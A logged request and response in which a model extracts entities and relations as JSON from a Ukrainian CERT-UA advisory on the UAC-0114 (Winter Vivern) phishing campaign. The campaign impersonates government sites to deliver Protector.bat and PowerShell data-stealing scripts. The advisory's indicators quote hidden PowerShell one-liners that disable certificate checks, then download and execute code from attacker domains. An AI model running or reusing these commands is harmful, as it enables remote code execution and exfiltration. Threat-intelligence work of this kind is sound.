@@ -1,0 +1,253 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA виявлено вебсторінку, що імітує офіційний вебресурс Міністерства закордонних справ України, на якій пропонується завантажити програмне забезпечення для "виявлення заражених комп'ютерів".&nbsp;</p><p>У разі переходу за посиланням на ЕОМ буде завантажено BAT-файл "Protector.bat", відкриття якого призведе до завантаження та запуску на комп'ютері PowerShell-скриптів, один з яких забезпечить рекурсивний пошук файлів з розширеннями: .edb, .ems, .eme, .emz, .key, .pem, .ovpn, .bat, .cer, .p12, .cfg, .log, .txt, .pdf, .doc, .docx, .xls, .xlsx, .rdg в каталозі робочого столу, створення знімків екрану та подальшу ексфільтрацію даних за допомогою HTTP. При цьому, передбачено створення запланованих завдань, призначених для забезпечення персистентності.</p><p>В рамках співпраці з CERT Polska та CSIRT MON <span style="color: rgb(5, 5, 5);">(Республіка Польща)</span> виявлено аналогічні фішингові ресурси, що імітують офіційні вебсторінки МЗС України, СБ України, а також Поліції Польщі. Слід зауважити, що в червні 2022 року подібна фішінгова вебсторінка імітувала вебінтерфейс поштового серверу МО України.</p><p>Згадана активність відстежується за ідентифікатором UAC-0114 (також відома як Winter Vivern).&nbsp;</p><p>Слід зауважити, що тактики, техніки та процедури, що використовуються групою, є доволі типовими: одноманітні PowerShell-скрипти, тема "сканерів шкідливих програм". Крім того, високоймовірно, що до складу групи входять російськомовні учасники, адже одна з використовуваних шкідливих програм APERETIF (MD5: 3acfb7c694b259158fe042fd3392b0d1) містить доволі характерний рядок (PDB): "C:\Users\user_1\source\repos\Aperitivchick\Release\SystemProtector.pdb".</p><p>&nbsp;&nbsp;&nbsp;</p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">93beb3454664314826a843ae28befe96&nbsp; &nbsp; b10bc0bb30b3c1d0c404d3a902ccebc425f23cb5a66c02104739f226c77b5816&nbsp; &nbsp; Забезпечення кібербезпеки.html
+42b6b2533135574ac8a2027df465b295&nbsp; &nbsp; 05457a790782542d3f16c9b8368a077b458ff7349856e6da541223a51e94b9c8&nbsp; &nbsp; Protector.bat
+4d6eac0b0dd1adc47d81b163d03e5f4b&nbsp; &nbsp; 91e9325dd4972c0d40becfff6e65399c46aeb210a3b9a1f75d453cc8fe87d09c&nbsp; &nbsp; fjasmngptwq95824s.php
+a03cb9a28fa5ce72354e1556731a68d4&nbsp; &nbsp; cf919033a2a4f76a4b78499be027090a0a7980a2f536df53eebb2140478abeb7&nbsp; &nbsp; LG5362s5215098-xvbxzcnsaf4lmsa.php
+4d549fa15eadeefd30f5269a2b3995c4&nbsp; &nbsp; 521c8345351144437033b41dfb5e4878c3b3a7ade4e2d0ccdcc5699d0b4d3ac6&nbsp; &nbsp; fx64g15g.xml
+7ffb80d87ab0fe5e2c7f7338ec22a7b0&nbsp; &nbsp; 3442724f36fcaa1822bdafc3417e6bc7488898c4acbc73f0114ffeb6a3604164&nbsp; &nbsp; 9f5fe4bab163de5eedb995beed21c75578284fa4.php
+ed7bb4cc6dd1079efbe4bc3ceffd4250&nbsp; &nbsp; d8236c841b07c933d4de0ef9ed854902f6aae73b83137d9ffbe29fb879aa094f&nbsp; &nbsp; 62d4677fcf600ac0c4933bd80dec255868827e00.php
+9997462826c26ab82a29e1c0712bbbb5&nbsp; &nbsp; 2708b9f8a196c50c8c6d6001af5b02e3c5d113e1977a686319eae7652ecbc1d3&nbsp; &nbsp; 62d4677fcf600ac0c4933bd80dec255868827e00.dec.ps1
+6fe2a60e3f4c15c60128562d006696b6&nbsp; &nbsp; 72028cff34d33e26bf01e4bf63c8b977ece33b3809bd6dd075bcff343895dc4b&nbsp; &nbsp; Protector.bat
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%APPDATA%\XmlSchemaMicrosoftXsd.xml
+%APPDATA%\XmlSchemaMicrosoftXsdO.xml
+%PUBLIC%\MicrosoftUpdateClient\
+%PUBLIC%\MicrosoftUpdateClient\Microsoft_update_tool_%NUM%.dat
+powershell.exe -c "Start-Process -win hidden -filepath 'powershell.exe' -argumentlist ""`$a=whoami;"",""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex (New-Object Net.WebClient).DownloadString('hXXps://bugiplaysec[.]com/fjasmngptwq214.php')"""
+powershell.exe -c "Start-Process -win hidden -filepath 'powershell.exe' -argumentlist ""`$a=whoami;"",""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};iex (New-Object Net.WebClient).DownloadString('hXXps://troadsecow[.]com/fjasmngptwq95824s.php')"""
+Client_Update_Microsofts-{ITCUNTH-9D12-4RE1-8BWD-6HFI2D4FNI1I2}
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hXXps://bugiplaysec[.]com/ssu.gov.ua/
+hXXps://ocspdep[.]com/ssu.gov.ua/
+hXXp://troadsecow[.]com/policja.gov.pl
+hXXps://troadsecow[.]com/cbzc.policja.gov.pl
+hXXps://troadsecow[.]com/mfa.gov.ua/
+hXXps://troadsecow[.]com/mfa.gov.ua/downloadapp.php
+hXXps://troadsecow[.]com/
+hXXps://troadsecow[.]com/76bja21412/c6bd801d882333fdb93dd17308b3e2de3a78cc05_.php
+hXXps://troadsecow[.]com/76bja21412/c6bd801d882333fdb93dd17308b3e2de3a78cc05_1.php
+hXXps://bugiplaysec[.]com/fjasmngptwq214.php
+hXXps://troadsecow[.]com/fjasmngptwq95824s.php
+hXXps://troadsecow[.]com/gkaslnwqpasg/fx64g15g.xml
+hXXps://troadsecow[.]com/gkaslnwqpasg/usersfolders/%SID%/59948e7126a2927a53af0593f85dad2f5ae5c6e0.php
+hXXps://troadsecow[.]com/gkaslnwqpasg/usersfolders/%SID%/62d4677fcf600ac0c4933bd80dec255868827e00.php
+hXXps://troadsecow[.]com/gkaslnwqpasg/usersfolders/%SID%/9f5fe4bab163de5eedb995beed21c75578284fa4.php
+hXXps://troadsecow[.]com/lg5362s5215098-xvbxzcnsaf4lmsa.php
+hXXps://troadsecow[.]com/lg5362s5215098-xvbxzcnsaf4lmsa.php?idu=%SID%
+ocspdep[.]com&nbsp; &nbsp;    2021-12-01&nbsp; @registrar.eu
+troadsecow[.]com&nbsp; &nbsp; 2022-10-10&nbsp; @ownregistrar.com
+bugiplaysec[.]com&nbsp; &nbsp;2022-07-19&nbsp; @realtimeregister.com
+176[.]97.66.57&nbsp;     AE&nbsp; @iroko.net
+195[.]54.170.26     NO&nbsp; @iroko.net
+45[.]136.198.141&nbsp; &nbsp; BG&nbsp; @iroko.net
+80[.]79.119.239     GB&nbsp; @wavecom.ee (@3nt.com)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (6.7s, in 3761 / out 1605 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "Міністерства закордонних справ України",
+      "kind": "government body",
+      "gloss": "The government ministry responsible for Ukraine's foreign relations."
+    },
+    {
+      "name": "України",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "Protector.bat",
+      "kind": "malicious script",
+      "gloss": "A malicious batch script used to launch subsequent PowerShell commands and payloads."
+    },
+    {
+      "name": "CERT Polska",
+      "kind": "csirt",
+      "gloss": "The national computer emergency response team of Poland."
+    },
+    {
+      "name": "CSIRT MON",
+      "kind": "csirt",
+      "gloss": "The computer security incident response team of the Ministry of National Defence of Poland."
+    },
+    {
+      "name": "Республіка Польща",
+      "kind": "country",
+      "gloss": "A sovereign state in Central Europe."
+    },
+    {
+      "name": "МЗС України",
+      "kind": "government body",
+      "gloss": "The Ministry of Foreign Affairs of Ukraine."
+    },
+    {
+      "name": "СБ України",
+      "kind": "government body",
+      "gloss": "The Security Service of Ukraine, the country's primary security agency."
+    },
+    {
+      "name": "Поліції Польщі",
+      "kind": "government body",
+      "gloss": "The national police force of Poland."
+    },
+    {
+      "name": "МО України",
+      "kind": "government body",
+      "gloss": "The Ministry of Defence of Ukraine."
+    },
+    {
+      "name": "UAC-0114",
+      "kind": "threat group",
+      "gloss": "A threat actor group also known as Winter Vivern that targets government organizations in Europe and Ukraine."
+    },
+    {
+      "name": "Winter Vivern",
+      "kind": "threat group",
+      "gloss": "An alias for the cyber threat group tracked as UAC-0114."
+    },
+    {
+      "name": "APERETIF",
+      "kind": "malware family",
+      "gloss": "A malware family used by the Winter Vivern (UAC-0114) threat actor group."
+    },
+    {
+      "name": "Забезпечення кібербезпеки.html",
+      "kind": "file",
+      "gloss": "An HTML file used as part of a phishing attack."
+    },
+    {
+      "name": "bugiplaysec[.]com",
+      "kind": "hostname",
+      "gloss": "A malicious domain used by threat actors for hosting phishing pages and scripts."
+    },
+    {
+      "name": "troadsecow[.]com",
+      "kind": "hostname",
+      "gloss": "A malicious domain used by threat actors to host phishing pages and malware payloads."
+    },
+    {
+      "name": "ocspdep[.]com",
+      "kind": "hostname",
+      "gloss": "A malicious domain used in phishing infrastructure mimicking government entities."
+    },
+    {
+      "name": "176[.]97.66.57",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat infrastructure."
+    },
+    {
+      "name": "195[.]54.170.26",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat infrastructure."
+    },
+    {
+      "name": "45[.]136.198.141",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat infrastructure."
+    },
+    {
+      "name": "80[.]79.119.239",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0114",
+      "type": "is-also-known-as",
+      "tail": "Winter Vivern",
+      "evidence": "UAC-0114 (також відома як Winter Vivern)"
+    },
+    {
+      "head": "UAC-0114",
+      "type": "uses-malware",
+      "tail": "APERETIF",
+      "evidence": "одна з використовуваних шкідливих програм APERETIF"
+    },
+    {
+      "head": "CERT Polska",
+      "type": "located-in",
+      "tail": "Республіка Польща",
+      "evidence": "CERT Polska та CSIRT MON (Республіка Польща)"
+    },
+    {
+      "head": "CSIRT MON",
+      "type": "located-in",
+      "tail": "Республіка Польща",
+      "evidence": "CSIRT MON (Республіка Польща)"
+    },
+    {
+      "head": "Поліції Польщі",
+      "type": "located-in",
+      "tail": "Республіка Польща",
+      "evidence": "Поліції Польщі"
+    },
+    {
+      "head": "Міністерства закордонних справ України",
+      "type": "located-in",
+      "tail": "України",
+      "evidence": "Міністерства закордонних справ України"
+    },
+    {
+      "head": "МЗС України",
+      "type": "located-in",
+      "tail": "України",
+      "evidence": "МЗС України"
+    },
+    {
+      "head": "СБ України",
+      "type": "located-in",
+      "tail": "України",
+      "evidence": "СБ України"
+    },
+    {
+      "head": "МО України",
+      "type": "located-in",
+      "tail": "України",
+      "evidence": "МО України"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "is-also-known-as",
+      "definition": "The head entity is known by an alternative identifier or alias."
+    },
+    {
+      "name": "uses-malware",
+      "definition": "The threat actor or group utilizes a specific malware family in its operations."
+    },
+    {
+      "name": "located-in",
+      "definition": "The entity is located within or belongs to a particular country or state."
+    }
+  ]
+}
